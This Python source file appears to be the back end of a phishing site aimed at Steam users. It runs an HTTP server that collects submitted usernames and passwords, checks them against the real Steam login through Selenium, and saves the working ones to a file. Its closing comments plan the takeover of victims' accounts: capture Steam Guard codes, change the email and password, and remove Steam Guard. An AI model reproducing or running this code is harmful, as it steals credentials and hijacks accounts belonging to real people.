import socketserver
import http.server
import logging
import cgi
from selenium import webdriver

PORT = 80
driver = webdriver.Chrome("chromedriver.exe")

class ServerHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        logging.error(self.headers)
        http.server.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        logging.error(self.headers)
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={'REQUEST_METHOD':'POST',
                     'CONTENT_TYPE':self.headers['Content-Type'],
                     })
        
        for item in form.list:
            logging.error(item)
            
        http.server.SimpleHTTPRequestHandler.do_GET(self)

        #with open("data.txt", "w") as file:
        #    for key in form.keys(): 
        #        file.write(str(form.getvalue(str(key))) + ",")

        # Try login
        
        usrnme = str(form.getvalue("username"))
        passwd = str(form.getvalue("password"))

        print("Username:", usrnme, "Password:", passwd)

        driver.get("https://steamcommunity.com/login/")
        script_1 = open("scripts/login_1.js", "r").read().replace("{usrnme}", usrnme).replace("{passwd}", passwd)
        error = driver.execute_script("return " + script_1)

        if (error == False):
            pr_file = open("data.txt", "r").read()
            with open("data.txt", "w") as file:
                file.write(pr_file)
                for key in form.keys(): 
                    file.write(str(form.getvalue(str(key))) + ",")

        #else:
            #if user has steam guard
            #    ask user for Steam guard code
        

Handler = ServerHandler
httpd = socketserver.TCPServer(("", PORT), Handler)

print("serving at port", PORT)
httpd.serve_forever()

#recieve form post data, as in memory
#open selenium, try login
#  if username and password correct, ask for Steam guard code
#    if login successful
#      change email address, change password, remove steam guard, add account to group.
#  else
#    display incorrect username/password error to user, ask them to login again.
